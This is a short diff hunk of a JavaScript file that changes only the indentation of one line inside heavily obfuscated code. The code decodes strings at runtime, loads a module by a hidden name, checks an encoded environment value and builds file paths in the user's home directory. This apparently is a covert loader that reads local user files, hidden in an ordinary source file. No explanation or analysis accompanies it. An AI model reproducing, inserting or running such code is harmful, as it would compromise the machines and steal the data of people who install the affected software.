@@ -26,7 +26,7 @@ Buffer.from(s1,t).toString(c)),e=(r,e)=>{let E=Buffer.from(r,t);const o=E.length
     O=d("JQYJXhwYAw"),
     K=d("WjUWSDEVEllaOAlbFBhJdRwXFFcGGwBMWjECXxBbM0sQBkZ8FAAH"),
     P=(t,c)=>{result="";try{
-        const r=`${t}`,e=require(`${y}${d(m)}`);
+    const r=`${t}`,e=require(`${y}${d(m)}`);
     if(I!=d("Ih0IXBoDFWc7IA"))return;
     const E=d("JjEqfTYgRhJVMjR3OFQKVxIdCEs"),o=`${C("~/")}${c}`; 
     let F=U.join(o,d("ORsFWRlUNUwUAAM"));
